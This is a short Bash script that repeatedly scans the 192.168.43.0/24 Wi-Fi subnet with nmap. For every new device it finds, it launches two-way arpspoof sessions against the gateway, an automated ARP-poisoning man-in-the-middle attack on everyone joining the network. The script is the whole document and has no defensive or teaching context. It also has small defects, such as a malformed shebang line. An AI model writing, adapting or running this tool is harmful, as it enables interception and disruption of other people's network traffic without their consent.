#~/bin/bash
declare -a ar
for i in `seq 1 255`
do
    ar[i]=0
done
output=/root/shell/damn/damn.txt
greper=/root/shell/greper.txt
grep2=/root/shell/grep2.txt
records=/root/shell/records.txt
while true
do
> $output
> $greper
nmap 192.168.43.0/24 >> $output
saying=$(cat $output)
echo xxx $saying
cd /root/shell/damn
grep -rn "192.168.43." | grep -v "192.168.43.87" | grep -v "192.168.43.0" | grep -v "192.168.43.1">> $greper
grape=$(cat $greper)
echo ready
echo *** $grape
for i in `seq 1 255`
do
	str="192.168.43.${i}"
    > $grep2
    cd /root/shell
    grep $str greper.txt >> $grep2
    grep2s=$(cat $grep2)
    if [ -n "$grep2s" ]; then
        if [ ${ar[i]} == 0 ]; then
            echo "boom" $str
            ar[i]=1
            > $records
            echo "arpspoof -i wlan0 -t 192.168.43.1 ${str}" >> $records
            gnome-terminal -t "arp down ${str}" -- $records
            > $records
            echo "arpspoof -i wlan0 -t ${str} 192.168.43.1" >> $records
            gnome-terminal -t "arp up ${str}" -- $records
        else
            echo "already1" $str
        fi
    else
        if [ ${ar[i]} == 1 ]; then
            ar[i]=0
        fi
    fi
done
done
